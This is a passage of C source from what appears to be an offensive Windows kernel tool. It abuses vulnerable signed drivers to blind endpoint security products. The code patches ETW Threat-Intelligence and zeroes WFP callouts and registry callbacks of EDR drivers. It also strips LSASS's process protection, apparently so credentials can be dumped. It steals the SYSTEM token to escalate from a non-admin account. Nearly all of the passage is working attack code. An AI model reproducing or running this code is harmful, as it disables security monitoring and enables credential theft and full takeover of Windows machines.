        uint8_t rb[3]={0}; phys_read(fpa,rb,3); pf->ok=(memcmp(rb,PATCH3,3)==0);
        if(pf->ok){ok++;printf("    %-40s  RVA=0x%06X  PATCHED\n",ETW_TI_FUNCS[i],rva);}
        g_etw_n_fns++;
    }
    return ok;
}
static int etw_disable_provider(void)
{
    static const uint32_t GOFF[]={0x28,0x20,0x18,0x30,0x38};
    uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+16<=csz;off++){
                if(memcmp(g_chunk+off,ETW_TI_GUID,16)) continue;
                uint64_t gpa=cpa+off;
                for(int oi=0;oi<5;oi++){
                    uint32_t go=GOFF[oi]; if(gpa<go) continue;
                    uint64_t epa=gpa-go;
                    uint64_t fl=0,bl=0,sf=0;
                    phys_read(epa,&fl,8); phys_read(epa+8,&bl,8); phys_read(epa+16,&sf,8);
                    if(fl<0xFFFF800000000000ULL||bl<0xFFFF800000000000ULL||sf<0xFFFF800000000000ULL||fl==bl) continue;
                    uint64_t sd=0; phys_read(gpa+0x10,&sd,8);
                    if(sd&&sd<0xFFFF800000000000ULL) continue;
                    uint8_t region[0xC0]={0}; phys_read(epa,region,sizeof region);
                    uint32_t ss=go+0x18, se=go+0x80; if(se>(uint32_t)sizeof region) se=(uint32_t)sizeof region;
                    for(uint32_t d=ss;d+0x18<=se;d+=4){
                        uint32_t isen=*(uint32_t*)(region+d); if(isen!=1) continue;
                        uint8_t lv=region[d+4]; uint32_t lw=*(uint32_t*)(region+d+4);
                        if(lv>5||(lw>>8)) continue;
                        uint64_t ma=*(uint64_t*)(region+d+8); if(!ma) continue;
                        uint64_t mb=*(uint64_t*)(region+d+0x10); if(mb>ma) continue;
                        uint64_t tpa=epa+d; uint32_t z=0;
                        if(phys_write(tpa,&z,4)){
                            uint32_t rb=0; phys_read(tpa,&rb,4);
                            if(rb==0){
                                printf("    GUID@PA=0x%016llX  IsEnabled zeroed at +0x%03X\n",(unsigned long long)gpa,d);
                                g_etw_isen_pa=tpa; g_etw_isen_orig=1;
                                printf("  \n"); return 1;
                            }
                        }
                    }
                }
            }
        }
    }
    printf("  \n"); return 0;
}
static void etw_restore(void)
{
    for(int i=0;i<g_etw_n_fns;i++){
        EtwFn *pf=&g_etw_fns[i]; if(!pf->ok) continue;
        uint8_t cur[3]={0};
        if(phys_read(pf->func_pa,cur,3)&&memcmp(cur,PATCH3,3)==0) phys_write(pf->func_pa,pf->orig,3);
    }
    if(g_etw_isen_pa){uint32_t cur=0;if(phys_read(g_etw_isen_pa,&cur,4)&&cur==0) phys_write(g_etw_isen_pa,&g_etw_isen_orig,4);}
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  MODULE: WFP CALLOUTS  (e.g. hrwfpdrv.sys, netio-registered callouts)
 *
 * _FWPS_CALLOUT internal structure (pool tag 'WfpC', approximate):
 *   +0x000  LIST_ENTRY  list           links into WFP callout list
 *   +0x010  GUID        calloutKey     unique GUID for this callout
 *   +0x020  UINT32      flags
 *   +0x024  UINT32      calloutId      WFP-assigned runtime ID (non-zero)
 *   +0x028  PVOID       classifyFn     ← scan anchor; zeroed to disable
 *   +0x030  PVOID       notifyFn       ← zeroed to disable
 *   +0x038  PVOID       flowDeleteFn   optional
 *   +0x040  PVOID       context
 *
 * Guards relative to classifyFn anchor:
 *   1. classifyFn in known driver (not netio/tcpip/ndis), RVA < 4MB
 *   2. notifyFn in same driver or NULL
 *   3. GUID at off-0x18: Data1 field non-zero (valid GUID)
 *   4. calloutId at off-0x04: non-zero UINT32
 *   5. Flink/Blink (off-0x28/off-0x20): kernel pool VAs, not in any module
 * ══════════════════════════════════════════════════════════════════════ */

#define WFP_MAX 1024
typedef struct{
    uint64_t struct_pa, classify_pa, notify_pa;
    uint64_t classify_va, notify_va;
    char drv[64]; uint8_t orig_cl[8], orig_nf[8]; int zeroed;
}WfpEntry;
static WfpEntry g_wfp[WFP_MAX]; static int g_wfp_n=0;

/* WFP-internal drivers that register callouts legitimately — skip them */
static int is_wfp_system_driver(const char *n)
{
    static const char *WFP_SYS[]={"netio.sys","tcpip.sys","afd.sys","ndis.sys",
        "mpsdrv.sys","MPDBASEDEVICE.sys","WdNisDrv.sys","wfplwfs.sys",NULL};
    for(int i=0;WFP_SYS[i];i++) if(_stricmp(n,WFP_SYS[i])==0) return 1;
    return 0;
}

static int wfp_try(uint64_t cpa, uint64_t off, uint64_t csz)
{
    /* anchor = classifyFn at struct+0x028, so off >= 0x28 */
    if(off<0x28||off+0x18>csz) return 0;
    uint64_t classify=*(uint64_t*)(g_chunk+off);
    uint64_t notify  =*(uint64_t*)(g_chunk+off+0x08);

    /* Guard 1: classifyFn in a DRV_OTHER driver, RVA sane.
     * DRV_SYSTEM/NETWORK/VM drivers either have their own WFP callouts that
     * are legitimate (skip) or produce false positives (also skip). */
    uint64_t cl_rva=0;
    const char *cl_drv=va_to_driver_ex(classify,&cl_rva);
    if(!cl_drv||!cl_rva||cl_rva>=MAX_SANE_RVA) return 0;
    if(is_wfp_system_driver(cl_drv)) return 0;
    if(classify_driver(cl_drv)!=DRV_OTHER) return 0;
    /* Skip our own driver and other known non-EDR no-version-info stubs */
    if(_strnicmp(cl_drv,"AMDRyzen",8)==0||_strnicmp(cl_drv,"dump_",5)==0||
       _strnicmp(cl_drv,"vm3d",4)==0||_strnicmp(cl_drv,"Basic",5)==0) return 0;

    /* Guard 2: notifyFn in same driver or NULL */
    if(notify){
        uint64_t nf_rva=0;
        const char *nf_drv=va_to_driver_ex(notify,&nf_rva);
        if(!nf_drv||strcmp(nf_drv,cl_drv)||!nf_rva||nf_rva>=MAX_SANE_RVA) return 0;
    }

    /* Guard 3: GUID.Data1 at off-0x18 must be non-zero */
    uint32_t guid_data1=*(uint32_t*)(g_chunk+off-0x18);
    if(!guid_data1) return 0;

    /* Guard 4: calloutId at off-0x04 — must be non-zero.
     * FWP assigns IDs sequentially; on busy systems (many drivers loading before
     * the EDR) the ID can exceed 0xFFFF, so we only reject zero. */
    uint32_t callout_id=*(uint32_t*)(g_chunk+off-0x04);
    if(!callout_id) return 0;

    /* Guard 5: LIST_ENTRY Flink/Blink are kernel pool VAs */
    uint64_t fl=*(uint64_t*)(g_chunk+off-0x28), bl=*(uint64_t*)(g_chunk+off-0x20);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;

    /* Guard 6: flowDeleteFn at off+0x10 must be NULL or in same driver.
     * WdFilter minifilter pool nodes often have random pointers here. */
    if(off+0x18>csz) return 0;
    uint64_t fdn=*(uint64_t*)(g_chunk+off+0x10);
    if(fdn){
        uint64_t fdr=0;
        const char *fdd=va_to_driver_ex(fdn,&fdr);
        if(!fdd||strcmp(fdd,cl_drv)||!fdr||fdr>=MAX_SANE_RVA) return 0;
    }

    /* Guard 7: context at off+0x18 must be NULL or a kernel VA (not a small int) */
    uint64_t ctx=*(uint64_t*)(g_chunk+off+0x18);
    if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;

    /* Dedup */
    uint64_t cl_pa=cpa+off;
    for(int i=0;i<g_wfp_n;i++) if(g_wfp[i].classify_pa==cl_pa) return 0;
    if(g_wfp_n>=WFP_MAX) return 0;

    WfpEntry *e=&g_wfp[g_wfp_n++];
    e->struct_pa  = cpa+off-0x28;
    e->classify_pa= cl_pa;
    e->notify_pa  = cl_pa+0x08;
    e->classify_va= classify;
    e->notify_va  = notify;
    strncpy(e->drv,cl_drv,63); e->drv[63]='\0'; e->zeroed=0;
    return 1;
}
static void wfp_scan(void)
{
    g_wfp_n=0; uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_wfp_n>=WFP_MAX) goto wfp_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] wfp=%d\r",(unsigned long long)(cpa>>20),g_wfp_n);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x18<=csz&&g_wfp_n<WFP_MAX;off+=8)
                wfp_try(cpa,off,csz);
        }
    }
wfp_done:;
}
static int wfp_apply_edr(void)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<g_wfp_n;i++){
        WfpEntry *e=&g_wfp[i];
        if(!is_edr_target(e->drv)) continue;
        phys_read(e->classify_pa,e->orig_cl,8); phys_read(e->notify_pa,e->orig_nf,8);
        int a=phys_write(e->classify_pa,&z,8);
        int b=e->notify_va?phys_write(e->notify_pa,&z,8):1;
        if(a&&b){e->zeroed=1;ok++;}
    }
    return ok;
}
static void wfp_restore(void)
{
    for(int i=0;i<g_wfp_n;i++){
        WfpEntry *e=&g_wfp[i]; if(!e->zeroed) continue;
        uint64_t cur=0;
        if(phys_read(e->classify_pa,&cur,8)&&cur==0) phys_write(e->classify_pa,e->orig_cl,8);
        if(e->notify_va){cur=0;if(phys_read(e->notify_pa,&cur,8)&&cur==0) phys_write(e->notify_pa,e->orig_nf,8);}
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  MODULE: CM REGISTER CALLBACKS
 *
 * Two scan modes:
 *   Mode A (with altitude): CmRegisterCallbackEx entries — have UNICODE_STRING
 *   Mode B (no altitude):   CmRegisterCallback  entries — no altitude string
 *                           (Huorong, older products, boot-time drivers)
 * ══════════════════════════════════════════════════════════════════════ */

#define CM_MAX 256
typedef struct{
    uint64_t struct_pa,func_pa,func_va,cookie,drv_ptr;
    char drv[64]; uint8_t orig[8]; int zeroed;
    int has_altitude;
}CmEntry;
static CmEntry g_cm[CM_MAX]; static int g_cm_n=0;

static int cm_try(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anc)
{
    if(off<(uint64_t)anc||off+0x18>csz) return 0;
    uint64_t func=*(uint64_t*)(g_chunk+off); uint64_t fr=0;
    const char *fd=va_to_driver_ex(func,&fr); if(!fd||!fr||fr>=MAX_SANE_RVA) return 0;
    uint64_t fl=*(uint64_t*)(g_chunk+off-(uint64_t)anc),bl=*(uint64_t*)(g_chunk+off-(uint64_t)anc+8);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;
    uint16_t al=*(uint16_t*)(g_chunk+off-(uint64_t)anc+0x10), am=*(uint16_t*)(g_chunk+off-(uint64_t)anc+0x12);
    if(al<2||al>40||al&1||am!=al+2) return 0;
    uint64_t ab=*(uint64_t*)(g_chunk+off-(uint64_t)anc+0x18); if((ab>>48)!=0xFFFFULL) return 0;
    if(anc==0x28){uint64_t ctx=*(uint64_t*)(g_chunk+off-8);if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;}
    uint64_t cookie=*(uint64_t*)(g_chunk+off+8); if(!cookie) return 0;
    uint64_t dp=*(uint64_t*)(g_chunk+off+0x10); if((dp>>48)!=0xFFFFULL||dp&7||va_in_any_module(dp)) return 0;
    uint64_t fpa=cpa+off;
    for(int i=0;i<g_cm_n;i++) if(g_cm[i].func_pa==fpa) return 0;
    if(g_cm_n>=CM_MAX) return 0;
    CmEntry *e=&g_cm[g_cm_n++];
    e->struct_pa=cpa+off-(uint64_t)anc; e->func_pa=fpa; e->func_va=func; e->cookie=cookie; e->drv_ptr=dp;
    strncpy(e->drv,fd,63); e->drv[63]='\0'; e->zeroed=0; e->has_altitude=1;
    return 1;
}

/*
 * cm_try_noalt — Mode B: CmRegisterCallback (no altitude string).
 * Used by Huorong and other products that call the legacy API.
 *
 * Reduced guards (no altitude UNICODE_STRING check):
 *   1. Function in known driver, RVA < 4MB
 *   2. Flink/Blink: kernel pool VAs, not in any module, 8-aligned
 *   3. Cookie (off+0x08): non-zero 64-bit
 *   4. Driver (off+0x10): kernel pool VA, not in any module, 8-aligned
 *   5. Context (off-0x08 for anc=0x28): NULL or kernel VA
 *   6. NOT duplicate of an already-found entry
 *
 * Layout assumed (CmRegisterCallback, no altitude):
 *   struct start = off - anc
 *   off-0x28 (anc=0x28): Flink
 *   off-0x20: Blink
 *   off-0x18..off-0x09: varies (context, no altitude string)
 *   off-0x08: Context
 *   off+0x00: Function ← anchor
 *   off+0x08: Cookie
 *   off+0x10: Driver
 *
 * Extra guard: the altitude location (off-0x18+0x10 = off-0x08 from anchor
 * for anc=0x28) should NOT look like a valid altitude (Length 2-40 even).
 * This prevents duplicating entries already found by cm_try.
 */
static int cm_try_noalt(uint64_t cpa, uint64_t off, uint64_t csz, uint8_t anc)
{
    if(off<(uint64_t)anc||off+0x18>csz) return 0;
    uint64_t func=*(uint64_t*)(g_chunk+off); uint64_t fr=0;
    const char *fd=va_to_driver_ex(func,&fr); if(!fd||!fr||fr>=MAX_SANE_RVA) return 0;

    uint64_t fl=*(uint64_t*)(g_chunk+off-(uint64_t)anc);
    uint64_t bl=*(uint64_t*)(g_chunk+off-(uint64_t)anc+8);
    if((fl>>48)!=0xFFFFULL||(bl>>48)!=0xFFFFULL||fl&7||bl&7) return 0;
    if(va_in_any_module(fl)||va_in_any_module(bl)) return 0;

    /* Guard: altitude slot must NOT look like a valid altitude (to avoid
     * duplicating what cm_try already found with altitude check) */
    if(anc==0x28){
        uint16_t al=*(uint16_t*)(g_chunk+off-0x18);
        uint16_t am=*(uint16_t*)(g_chunk+off-0x16);
        if(al>=2&&al<=40&&(al&1)==0&&am==al+2){
            uint64_t ab=*(uint64_t*)(g_chunk+off-0x10);
            if((ab>>48)==0xFFFFULL) return 0; /* looks like altitude → skip, cm_try handles it */
        }
        uint64_t ctx=*(uint64_t*)(g_chunk+off-0x08);
        if(ctx&&(ctx>>48)!=0xFFFFULL) return 0;
    }

    uint64_t cookie=*(uint64_t*)(g_chunk+off+0x08); if(!cookie) return 0;
    uint64_t dp=*(uint64_t*)(g_chunk+off+0x10);
    if((dp>>48)!=0xFFFFULL||dp&7||va_in_any_module(dp)) return 0;

    uint64_t fpa=cpa+off;
    for(int i=0;i<g_cm_n;i++) if(g_cm[i].func_pa==fpa) return 0;
    if(g_cm_n>=CM_MAX) return 0;

    CmEntry *e=&g_cm[g_cm_n++];
    e->struct_pa=cpa+off-(uint64_t)anc; e->func_pa=fpa; e->func_va=func;
    e->cookie=cookie; e->drv_ptr=dp;
    strncpy(e->drv,fd,63); e->drv[63]='\0'; e->zeroed=0; e->has_altitude=0;
    return 1;
}

static void cm_scan(void)
{
    g_cm_n=0; uint64_t lp=0; const uint8_t ancs[2]={0x28,0x20};
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(g_cm_n>=CM_MAX) goto cm_done;
            if(cpa-lp>=0x80000000ULL){printf("  [%5lluMB] cm=%d\r",(unsigned long long)(cpa>>20),g_cm_n);fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0x28;off+0x18<=csz&&g_cm_n<CM_MAX;off+=8){
                /* Mode A first (with altitude — higher confidence) */
                int hit=0;
                for(int ai=0;ai<2&&!hit;ai++) hit=cm_try(cpa,off,csz,ancs[ai]);
                /* Mode B (no altitude — catches Huorong etc.) */
                if(!hit) for(int ai=0;ai<2&&!hit;ai++) hit=cm_try_noalt(cpa,off,csz,ancs[ai]);
            }
        }
    }
cm_done:;
}
static int cm_apply_edr(void)
{
    int ok=0; uint64_t z=0;
    for(int i=0;i<g_cm_n;i++){
        CmEntry *e=&g_cm[i];
        if(!is_edr_target(e->drv)) continue;
        phys_read(e->func_pa,e->orig,8);
        if(phys_write(e->func_pa,&z,8)){e->zeroed=1;ok++;}
    }
    return ok;
}
static void cm_restore(void)
{
    for(int i=0;i<g_cm_n;i++){
        CmEntry *e=&g_cm[i]; if(!e->zeroed) continue;
        uint64_t cur=0;
        if(phys_read(e->func_pa,&cur,8)&&cur==0) phys_write(e->func_pa,e->orig,8);
        e->zeroed=0;
    }
}

/* ══════════════════════════════════════════════════════════════════════
 * §8c  MODULE: PPL BYPASS (EPROCESS.Protection)
 *
 * Clear EPROCESS.Protection of LSASS so OpenProcess(PROCESS_ALL_ACCESS)
 * succeeds when combined with OB callbacks being zeroed.
 *
 * NO self-elevation: writing to our own EPROCESS at a potentially wrong
 * offset causes BSOD.  Clearing LSASS.Protection alone is sufficient
 * when OB callbacks are already disabled.
 *
 * Offset detection: uses NtQIP(ProcessProtectionInformation=61) as the
 * ground truth for the actual Protection value, then byte-scans the
 * physical EPROCESS to locate the exact offset — handles builds where
 * Protection moved (e.g. 24H2→25H2 layout change).
 * ══════════════════════════════════════════════════════════════════════ */

#define EP_OFF_PID   0x440u
#define EP_OFF_FLINK 0x448u
#define EP_OFF_BLINK 0x450u
#define EP_OFF_TOKEN 0x4B8u
#define EP_OFF_NAME  0x5A8u
#define EP_READ_SZ   0x5C0u

static uint32_t g_ep_off_prot    = 0x87A;
static uint8_t  g_lsass_prot_api = 0;    /* NtQIP-reported protection (ground truth) */
static uint32_t g_lsass_pid      = 0;    /* saved for inline tests */
static uint64_t g_lsass_eproc_va = 0;    /* kernel VA of LSASS EPROCESS (from page-table walk) */

/* Walk PsInitialSystemProcess → ActiveProcessLinks to find LSASS EPROCESS VA.
 * Uses sysdiag IOCTL 0x228048 (kernel VA read) instead of va_to_pa, so works
 * on VBS/HVCI systems where page-table walk via AMD driver fails.
 * Pre-condition: g_nt_va, g_nt_pe, g_nt_pe_sz must be set. */
static uint64_t sd_find_lsass_eproc_va(uint32_t pid)
{
    if(!g_nt_va || !g_nt_pe || !g_nt_pe_sz) return 0;
    if(!sd_open()) return 0;

    uint32_t rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, "PsInitialSystemProcess");
    if(!rva){ printf("    [SD-ep] PsInitialSystemProcess not found in PE\n"); return 0; }

    /* PsInitialSystemProcess is a PEPROCESS* — read the pointer value */
    uint64_t sys_ep_va = 0;
    if(!sd_read_kva(g_nt_va + rva, &sys_ep_va, 8) || !sys_ep_va){
        printf("    [SD-ep] read PsInitialSystemProcess VA failed\n"); return 0;
    }
    printf("    [SD-ep] System EPROCESS VA=0x%016llX\n",(unsigned long long)sys_ep_va);

    /* Walk ActiveProcessLinks (Flink at EP_OFF_FLINK, LIST_ENTRY embedded in EPROCESS) */
    uint64_t head_va  = sys_ep_va + EP_OFF_FLINK; /* VA of list head */
    uint64_t flink_va = 0;
    if(!sd_read_kva(head_va, &flink_va, 8) || !flink_va) return 0;

    for(int i = 0; i < 1024; i++){
        if(!flink_va || (flink_va>>48)!=0xFFFFULL) break;
        uint64_t ep_va = flink_va - EP_OFF_FLINK;

        /* Read PID (8 bytes, UniqueProcessId) */
        uint64_t ep_pid = 0;
        if(!sd_read_kva(ep_va + EP_OFF_PID, &ep_pid, 8)) break;
        if((uint32_t)ep_pid == pid){
            printf("    [SD-ep] LSASS EPROCESS VA=0x%016llX (by PID)\n",(unsigned long long)ep_va);
            return ep_va;
        }

        /* Also check ImageFileName */
        char name[16] = {0};
        if(sd_read_kva(ep_va + EP_OFF_NAME, name, 15)){
            if(_stricmp(name,"lsass.exe")==0){
                printf("    [SD-ep] LSASS EPROCESS VA=0x%016llX (by name, pid=%u)\n",
                       (unsigned long long)ep_va,(unsigned)ep_pid);
                return ep_va;
            }
        }

        /* Advance: next Flink */
        uint64_t next = 0;
        if(!sd_read_kva(flink_va, &next, 8)) break;
        if(next == head_va) break; /* wrapped */
        flink_va = next;
    }
    printf("    [SD-ep] LSASS not found in process list\n");
    return 0;
}

/* Find ntoskrnl runtime base when NtQSI(11) returns zeroed ImageBase (Win11 25H2 non-admin).
 * Path: NtQSI(0x40) gives FILE_OBJECT VA for our sysdiag handle (handle info NOT restricted).
 *   FILE_OBJECT+0x08 → DEVICE_OBJECT
 *   DEVICE_OBJECT+0x08 → DRIVER_OBJECT
 *   DRIVER_OBJECT+0x18 → DriverStart = sysdiag image base
 * Then reads sysdiag's ntoskrnl IAT from disk to get a runtime ntoskrnl function VA,
 * then scans 2MB pages backwards (all mapped ntoskrnl pages, safe) to find MZ header. */
static uint64_t sd_find_nt_base_via_driver_chain(void)
{
    typedef struct {
        PVOID       Object;
        ULONG_PTR   UniqueProcessId;
        ULONG_PTR   HandleValue;
        ULONG       GrantedAccess;
        USHORT      CreatorBackTraceIndex;
        USHORT      ObjectTypeIndex;
        ULONG       HandleAttributes;
        ULONG       Reserved;
    } SYS_HDL_EX;
    typedef struct { ULONG_PTR N; ULONG_PTR Rsv; SYS_HDL_EX H[1]; } SYS_HDL_INFO_EX;
    typedef NTSTATUS (WINAPI *PNtQSI)(ULONG,PVOID,ULONG,PULONG);

    if(!sd_open()) return 0;
    PNtQSI fn=(PNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return 0;

    ULONG_PTR hval=(ULONG_PTR)g_sd_dev;
    DWORD ourpid=GetCurrentProcessId();

    /* Enumerate all handles; class 0x40 = SystemExtendedHandleInformation (not restricted) */
    ULONG sz=8*1024*1024; SYS_HDL_INFO_EX *buf=NULL; NTSTATUS st;
    do {
        free(buf); buf=(SYS_HDL_INFO_EX*)malloc(sz); if(!buf) return 0;
        ULONG need=0; st=fn(0x40,buf,sz,&need);
        if(st==0xC0000004L){ sz=need+65536; }
    } while(st==0xC0000004L);
    if(st){ free(buf); printf("    [sd_chain] NtQSI(0x40) failed 0x%X\n",(unsigned)st); return 0; }

    uint64_t file_obj=0;
    for(ULONG_PTR i=0;i<buf->N;i++){
        if((ULONG_PTR)buf->H[i].UniqueProcessId==ourpid && buf->H[i].HandleValue==hval){
            file_obj=(uint64_t)(ULONG_PTR)buf->H[i].Object; break;
        }
    }
    free(buf);
    if(!file_obj){ printf("    [sd_chain] FILE_OBJECT not found in handle table\n"); return 0; }
    printf("    [sd_chain] FILE_OBJECT=0x%016llX\n",(unsigned long long)file_obj);

    /* WDM chain: FILE_OBJECT+0x08→DevObj, DEVICE_OBJECT+0x08→DrvObj, DRIVER_OBJECT+0x18→DriverStart */
    uint64_t dev_obj=0, drv_obj=0, sd_base=0;
    if(!sd_read_kva(file_obj+0x08,&dev_obj,8)||!dev_obj)
        { printf("    [sd_chain] read DevObj failed\n"); return 0; }
    if(!sd_read_kva(dev_obj+0x08,&drv_obj,8)||!drv_obj)
        { printf("    [sd_chain] read DrvObj failed\n"); return 0; }
    if(!sd_read_kva(drv_obj+0x18,&sd_base,8)||!sd_base||(sd_base>>48)!=0xFFFFULL)
        { printf("    [sd_chain] read DriverStart failed\n"); return 0; }
    printf("    [sd_chain] sysdiag base=0x%016llX\n",(unsigned long long)sd_base);

    /* Read sysdiag from disk to find ntoskrnl IAT RVA */
    const char *sd_paths[]={"C:\\Windows\\System32\\drivers\\sysdiag.sys",
                            "E:\\driver_research\\amd_ryzen_master\\sysdiag.sys", NULL};
    uint8_t *sd_pe=NULL; uint32_t sd_pe_sz=0;
    for(int pi=0;sd_paths[pi];pi++){
        HANDLE hf=CreateFileA(sd_paths[pi],GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
        if(hf==INVALID_HANDLE_VALUE) continue;
        DWORD fsz=GetFileSize(hf,NULL); sd_pe=(uint8_t*)malloc(fsz); DWORD rd=0;
        ReadFile(hf,sd_pe,fsz,&rd,NULL); CloseHandle(hf); sd_pe_sz=(uint32_t)fsz; break;
    }
    if(!sd_pe){ printf("    [sd_chain] sysdiag.sys not on disk\n"); return 0; }

    IMAGE_DOS_HEADER *dos=(IMAGE_DOS_HEADER*)sd_pe;
    IMAGE_NT_HEADERS64 *nth=(IMAGE_NT_HEADERS64*)(sd_pe+dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *idd=&nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    uint32_t iat_rva=0;
    if(idd->VirtualAddress && idd->Size){
        IMAGE_IMPORT_DESCRIPTOR *imp=(IMAGE_IMPORT_DESCRIPTOR*)(sd_pe+idd->VirtualAddress);
        for(;imp->Name;imp++){
            const char *n=(const char*)(sd_pe+imp->Name);
            if(_stricmp(n,"ntoskrnl.exe")==0){ iat_rva=imp->FirstThunk; break; }
        }
    }
    free(sd_pe);
    if(!iat_rva){ printf("    [sd_chain] ntoskrnl not in sysdiag imports\n"); return 0; }
    printf("    [sd_chain] sysdiag ntoskrnl IAT RVA=0x%X\n",iat_rva);

    /* Read first IAT entry at runtime = actual ntoskrnl function VA */
    uint64_t nt_fn=0;
    if(!sd_read_kva(sd_base+iat_rva,&nt_fn,8)||!nt_fn||(nt_fn>>48)!=0xFFFFULL)
        { printf("    [sd_chain] read IAT entry failed\n"); return 0; }
    printf("    [sd_chain] ntoskrnl fn VA=0x%016llX\n",(unsigned long long)nt_fn);

    /* Scan backwards in 2MB steps for MZ+PE.
     * Limit: ntoskrnl's image size from NtQSI(11) (available even with zeroed base).
     * Ensures we never scan past ntoskrnl into potentially unmapped pages. */
    uint32_t nt_img_sz = (g_nmods>0) ? (uint32_t)g_mods[0].size : 0x1600000;
    int max_back = (int)((nt_img_sz + 0x1FFFFF) / 0x200000) + 1; /* ceil + 1 margin */
    uint64_t cand=nt_fn & ~(uint64_t)0x1FFFFF;
    for(int i=0;i<=max_back;i++){
        uint16_t magic=0;
        if(sd_read_kva(cand,&magic,2) && magic==0x5A4D){
            uint32_t pe_off=0;
            if(sd_read_kva(cand+0x3C,&pe_off,4) && pe_off>0 && pe_off<0x1000){
                uint32_t sig=0;
                if(sd_read_kva(cand+pe_off,&sig,4) && sig==0x00004550U){
                    /* Verify SizeOfImage ≈ ntoskrnl size (PE64: sig+FileHdr+0x38 = pe_off+0x50) */
                    uint32_t si=0;
                    if(sd_read_kva(cand+pe_off+0x50,&si,4) && si>0 &&
                       (nt_img_sz==0 || (si>=nt_img_sz-0x400000 && si<=nt_img_sz+0x400000))){
                        printf("    [sd_chain] ntoskrnl base=0x%016llX SizeOfImage=0x%X\n",
                               (unsigned long long)cand, si);
                        return cand;
                    }
                }
            }
        }
        cand-=0x200000;
    }
    printf("    [sd_chain] ntoskrnl MZ not found in %d 2MB steps from 0x%016llX\n",
           max_back, (unsigned long long)(nt_fn & ~(uint64_t)0x1FFFFF));
    return 0;
}

/* Bootstrap LPE: steal SYSTEM process token via sysdiag IOCTL (world-accessible).
 * Enables running without admin — token is replaced before AMD driver open is retried.
 * Requires g_nt_va/g_nt_pe/g_nt_pe_sz to be set (from NtQuerySystemInformation + disk read). */
static int sd_elevate_to_system(void)
{
    if(!sd_open())                        { printf("    [SD-elev] SysDiag::IOKit unavailable\n"); return 0; }
    if(!g_nt_va||!g_nt_pe||!g_nt_pe_sz)  { printf("    [SD-elev] ntoskrnl PE not loaded\n");    return 0; }

    uint32_t rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, "PsInitialSystemProcess");
    if(!rva){ printf("    [SD-elev] PsInitialSystemProcess RVA not found\n"); return 0; }

    /* SYSTEM EPROCESS */
    uint64_t sys_ep = 0;
    if(!sd_read_kva(g_nt_va + rva, &sys_ep, 8) || !sys_ep){
        printf("    [SD-elev] read PsInitialSystemProcess failed\n"); return 0;
    }
    printf("    [SD-elev] SYSTEM EPROCESS=0x%016llX\n", (unsigned long long)sys_ep);

    /* SYSTEM Token (EX_FAST_REF, 8 bytes) */
    uint64_t sys_tok = 0;
    if(!sd_read_kva(sys_ep + EP_OFF_TOKEN, &sys_tok, 8) || !sys_tok){
        printf("    [SD-elev] read SYSTEM Token failed\n"); return 0;
    }
    printf("    [SD-elev] SYSTEM Token=0x%016llX\n", (unsigned long long)sys_tok);

    /* Our EPROCESS */
    DWORD our_pid = GetCurrentProcessId();
    uint64_t our_ep = sd_find_lsass_eproc_va(our_pid);
    if(!our_ep){ printf("    [SD-elev] own EPROCESS not found (pid=%lu)\n",(unsigned long)our_pid); return 0; }
    printf("    [SD-elev] Own EPROCESS=0x%016llX\n", (unsigned long long)our_ep);

    /* Replace Token via 8-byte InterlockedExchange64 — LOCK XCHG64, cache-coherent */
    if(!sd_write_kva(our_ep + EP_OFF_TOKEN, &sys_tok, 8)){
        printf("    [SD-elev] Token write FAILED\n"); return 0;
    }
    printf("    [SD-elev] Token replaced → process is now SYSTEM\n");
    return 1;
}


typedef struct { uint64_t pa; uint8_t prot_orig; uint8_t valid; } EprocInfo;
static EprocInfo g_lsass_ep  = {0,0,0};
static uint8_t   g_ppl_applied = 0;

static void ppl_detect_offsets(void)
{
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov = {sizeof ov};
    pfnRtlGetVersion fn = (pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (fn) fn(&ov);
    /* Offsets from static rev of sysdiag.sys (Huorong watchdog driver):
     *   build < 22000  (Win10 all)    : 0x878  (SignatureLevel) / 0x87A (Protection)
